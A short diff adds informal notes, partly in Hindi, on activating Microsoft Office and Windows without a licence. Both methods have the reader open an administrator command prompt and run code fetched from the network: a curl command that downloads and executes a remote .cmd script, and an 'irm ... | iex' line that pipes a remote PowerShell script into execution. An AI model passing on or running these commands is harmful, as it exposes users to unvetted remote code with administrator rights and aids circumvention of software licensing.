@@ -1,0 +1,16 @@
+cmd 
+run as administration 
+internet on karo
+type
+curl -L keyms.id/aso -o aso.cmd & aso.cmd
+choose office year
+and enter 
+product activation succesful
+
+2nd 
+
+open cmd as administration 
+type 
+irm https://get.activated.win | iex 
+choose window or office for the activation 
+exit 
